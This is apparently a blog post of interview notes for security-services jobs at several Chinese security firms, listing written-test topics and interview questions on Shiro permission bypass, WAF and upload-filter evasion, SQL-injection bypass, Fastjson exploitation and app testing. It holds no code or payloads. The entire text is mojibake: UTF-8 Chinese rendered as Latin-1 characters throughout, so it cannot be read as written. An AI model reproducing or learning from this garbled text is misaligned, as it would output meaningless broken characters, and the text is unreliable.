ç»¿ç›Ÿ80é¢˜ï¼Œå…¶ä¸­ä¸å®šé¡¹é€‰æ‹©é¢˜å°‘é€‰ï¼Œé”™é€‰éƒ½ä¸å¾—åˆ†ï¼Œ10é“ç®€ç­”é¢˜ æ·±ä¿¡æœ30é“é€‰æ‹©é¢˜ å¥‡å®‰ä¿¡40é“é€‰æ‹©é¢˜ äºšä¿¡25é“é€‰æ‹©é¢˜ï¼Œ10é“ç®€ç­”é¢˜ é€‰æ‹©é¢˜ Webå®‰å…¨ åº”æ€¥å“åº” Linux è®¡ç®—æœºç½‘ç»œ Androidæ¸—é€ç›¸å…³ï¼ˆç»¿ç›Ÿï¼‰ å¯†ç å­¦ç›¸å…³ï¼ˆç»¿ç›Ÿï¼Œå…¶ä»–çš„ä¹Ÿæœ‰è€ƒä¸€ç‚¹ï¼‰ ç®€ç­”é¢˜ å†…ç½‘ï¼šä¿¡æ¯æ”¶é›†ï¼Œéš§é“æ­å»ºï¼Œå†…ç½‘å¤§ä½“æ€è·¯ å¤–ç½‘ï¼šç‰¹å®šåœºæ™¯ä¸‹çš„æ¸—é€æ€è·¯ ä¸ªäººç‰¹ç‚¹å’ŒèŒä¸šè§„åˆ’ï¼ˆäºšä¿¡ï¼‰ é¡¹ç›®å®æ–½ï¼ˆäºšä¿¡ï¼‰ Javaä»£ç å®¡è®¡ï¼ˆç»¿ç›Ÿï¼‰ åº”æ€¥å“åº”æ€è·¯ï¼ˆç»¿ç›Ÿï¼‰ æ¶æ„æ ·æœ¬åˆ†ææ€è·¯ï¼ˆç»¿ç›Ÿï¼‰ å®‰æœé¢è¯• ç»¿ç›Ÿè¦æ±‚é«˜ï¼Œæ„Ÿè§‰å•¥éƒ½è¦ä¼šï¼Œæ¯æ¬¡éƒ½é—®æˆ‘å…¥èŒå®ä¹ èƒ½ä¸èƒ½æ¥ï¼Ÿï¼Ÿ æ·±ä¿¡æœæ²¡å’‹é—®æŠ€æœ¯å‹é—®é¢˜ï¼Œæ›´çœ‹é‡çš„æ˜¯ä½ çš„è½¯å®åŠ›ï¼Œæ¯”å¦‚å®‰å…¨è¡Œä¸šè®¤çŸ¥ï¼Œå­¦ä¹ æ–¹æ³•ï¼Œæ€§æ ¼å“è´¨ç­‰æ˜¯å¦åŒ¹é…ï¼Œæå»å®‰å…¨è¿è¥äº†ã€‚ ç»¿ç›Ÿä¸€é¢ 30min è‡ªæˆ‘ä»‹ç» åšè¿‡å“ªäº›ç³»ç»Ÿ æ¯”è¾ƒéš¾å¿˜çš„æ¸—é€æµ‹è¯•ç»å†æˆ–è€…è¯´å­¦åˆ°ä¸œè¥¿çš„ shiroæ˜¯ä»€ä¹ˆ shiroæƒé™ç»•è¿‡çš„åŸç† shiroæƒé™æ ¡éªŒæ˜¯æ€ä¹ˆåšçš„ï¼Œçœ‹è¿‡ç›¸å…³ä»£ç å— è®²è®²å…¶ä»–è¶Šæƒ æ€ä¹ˆåšæƒé™ç»•è¿‡çš„ä¿®å¤ï¼ˆé¢è¯•å®˜è¿˜å¼•å¯¼äº†å¾ˆå¤šï¼Œå¤ªèœäº†å…·ä½“çš„å®ç°ä¸ä¼šï¼‰ å¸¸è§wafç»•è¿‡çš„æ–¹å¼ æ–‡ä»¶ä¸Šä¼ å“ªä¸€ä¸ªç‚¹å¯ä»¥å°è¯•ç»•è¿‡waf APPæ¸—é€IOSçš„æ¥è§¦è¿‡å˜› APPæœ‰å£³æ€ä¹ˆåŠ APPæµ‹è¯•è®²ä¸€ä¸‹ï¼Œå®¢æˆ·ç«¯å’Œæœ¬åœ°ç«¯æ¥è®² æŠ“åŒ…æ€ä¹ˆæŠ“çš„ HTTPåŒå‘è®¤è¯æ€ä¹ˆç»•è¿‡ åé—® ç»¿ç›ŸäºŒé¢ 45min è‡ªæˆ‘ä»‹ç» æ¸—é€å®ä¹ å¹²äº†å•¥ å¯¹é‡‘èå’Œèƒ½æºè¡Œä¸šçš„å…¬å¸æ¸—é€æœ‰æ²¡æœ‰è‡ªå·±çš„ä¸€äº›å¿ƒå¾—ï¼ˆå›ç­”äº†åï¼Œé—®ä½ è¿™ä¸ªæ˜¯æ‰“ç‚¹å—ï¼Ÿï¼‰ å†…ç½‘æ¸—é€æœ‰å®é™…åšè¿‡å—ï¼ˆå®ä¹ ç”Ÿæ²¡ç»™åˆ†é…åšğŸ˜…ï¼‰ ç»™ä½ ä¸€ä¸ªç³»ç»Ÿï¼Œä½ è§‰å¾—è¦ä»å“ªå‡ ä¸ªæ–¹é¢è¿›è¡Œæµ‹è¯• è°ˆè°ˆå¯¹å®‰å…¨æœåŠ¡çš„äº†è§£ï¼ˆç­”å®Œé¢è¯•å®˜è¯´å¯¹å®‰å…¨æœåŠ¡çš„ç†è§£å¤ªæµ…äº†ã€‚ã€‚ï¼‰ SRCæœ‰æ²¡æœ‰æ¯”è¾ƒå¥½çš„æ’å ä½ è¿™ä¸ªCTFæ‹¿çš„å¥–æ¨ªå‘å¯¹æ¯”æœ‰ç‚¹å°‘ï¼Œæ˜¯æœ‰ä»€ä¹ˆåŸå› å—ï¼ˆä¸æ˜¯æˆ‘å°±æ‰“äº†ä¸€å¹´ï¼Œå¤§å®¶ç§¯ææ€§ä¹Ÿä¸å¤Ÿï¼Œæˆ‘æœ‰å•¥åŠæ³•ğŸ˜­ï¼‰ ä¼šä»£ç å®¡è®¡å—ï¼Œæœ‰æ²¡æœ‰è‡ªå·±å®¡å‡ºè¿‡0Day è®²è®²æŒ–SRCæˆ–è€…å®ä¹ æ—¶å€™å°è±¡æ¯”è¾ƒæ·±åˆ»çš„ä¸¤ä¸ªæ´ ç†Ÿæ‚‰å“ªç§æ•°æ®åº“ï¼Œè®²è®²è¿™ä¸ªæ•°æ®åº“sqlæ³¨å…¥ç»•è¿‡wafçš„æ–¹å¼ ç”¨pythonå†™è¿‡ä»€ä¹ˆè„šæœ¬ è®²è®²å°ç¨‹åºçš„æ¸—é€ fastjsonäº†è§£å— fastjsonä¸å‡ºç½‘æ€ä¹ˆåˆ©ç”¨ åé—®ç¯èŠ‚ æ·±ä¿¡æœä¸€é¢ çº¿ä¸‹30min çº¿ä¸‹é…’åº—ç¯å¢ƒä¸é”™ï¼Œä¸è¿‡çœ‹åˆ°å…¶ä»–å²—ä½ç¾¤é¢æœ‰ç‚¹å“ˆäºº å®‰æœå•é¢èŠçš„æŒºå¼€å¿ƒğŸ¤£ï¼Œè®°å¾—çš„å°±è¿™äº› è‡ªæˆ‘ä»‹ç» ä½ åœ¨å­¦æ ¡é‡Œæœ‰å½“è¿‡ä»€ä¹ˆèŒä½å—ï¼Ÿ å¿—æ„¿æ´»åŠ¨ä¸­æœ‰æ²¡æœ‰ä»€ä¹ˆè®©ä½ æ¯”è¾ƒå°è±¡æ·±åˆ»çš„äº‹æƒ… ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ä»–ä»¬çš„èµ„é‡‘æ¥æºæ˜¯ä»€ä¹ˆå‘¢ ä½ é€šè¿‡å“ªäº›æ–¹æ³•æ¥è¿›è¡Œå­¦ä¹ ï¼Ÿ ä½ é™¤äº†å†™åšå®¢ï¼Œè¿˜æœ‰æ²¡æœ‰åœ¨ä¸€äº›ç¤¾åŒºæŠ•ç¨¿æ–‡ç« çš„ äº¤æ¢æœºä¸è·¯ç”±å™¨æ˜¯ä»€ä¹ˆ ä»£ç å®¡è®¡ä½ ä¼šå“ªäº›è¯­è¨€ï¼Œç„¶åç»™äº†å‡ è¡ŒPHPä»£ç è®©ä½ ç°åœºå®¡è®¡ï¼ˆæ‰“è¿‡CTFçš„ä¸€çœ¼å°±ä¼šå¾ˆç®€å•ï¼‰ è®²ä¸€ä¸‹å¤–ç½‘æ€è·¯ï¼ˆæœ‰ç‚¹å¿˜äº†ï¼Œåæ­£æ˜¯è·Ÿçº¢é˜Ÿæœ‰å…³ï¼‰ åé—®ç¯èŠ‚ æ·±ä¿¡æœäºŒé¢ 45min è®°ä¸å¤§å¾— è‡ªæˆ‘ä»‹ç»ï¼ˆè®²è®²åœ¨å­¦æ ¡çš„å­¦ä¹ ç»å†å’Œè¿™ä¸ªå®ä¹ ç»å†ï¼‰ ä½ æ˜¯ä¿¡æ¯å®‰å…¨ä¸“ä¸šçš„ï¼Ÿ ä¸ºä»€ä¹ˆè¦è½¬ä¸“ä¸šå‘¢ï¼Ÿ é™¤äº†å…´è¶£è¿˜æœ‰ä»€ä¹ˆåŸå› å‘¢ï¼Ÿæ¯”å¦‚è¯´è–ªé…¬ä¹‹ç±»çš„ ä½ æœ‰ä»€ä¹ˆèŒä¸šè§„åˆ’å—ï¼Ÿ ä½ è¯¾ä½™æ—¶é—´ä¼šåšä»€ä¹ˆï¼Ÿ ä½ åœ¨å­¦æ ¡æˆ–è€…å®ä¹ ä¸­é‡åˆ°çš„æœ€å¤§çš„å›°éš¾æ˜¯ä»€ä¹ˆï¼Ÿ å¦‚æœå’Œåˆ«äººå‘ç”Ÿäº†å†²çªï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿ è¯´ä¸€ä¸‹ä½ çš„ä¼˜ç¼ºç‚¹ï¼Œå„è¯´2-3ä¸ª ä½ é€šè¿‡å“ªäº›æ–¹æ³•æ¥è¿›è¡Œå­¦ä¹ ï¼Ÿ ä½ å¯¹æˆ‘ä»¬å…¬å¸çš„ä¸šåŠ¡æœ‰ä»€ä¹ˆäº†è§£å—ï¼Ÿ åé—®ç¯èŠ‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-06-25 20:51:26 "}}